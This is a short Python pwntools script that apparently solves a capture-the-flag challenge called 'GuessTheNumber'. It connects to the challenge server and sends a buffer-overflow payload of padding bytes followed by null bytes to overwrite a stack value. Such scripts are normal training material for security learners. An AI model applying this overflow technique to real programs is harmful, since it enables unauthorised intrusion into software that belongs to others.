from pwn import *

# min and max int in c
min = -2147483647
max = 2147483647

# file is guess the number
# p = process('./GuessTheNumber')
p = remote('gtn.challs.olicyber.it', 10022)

# read the first line
p.recvline()
payload = b'A' * 23 + b'\x00'*4
p.sendline(payload)
p.interactive()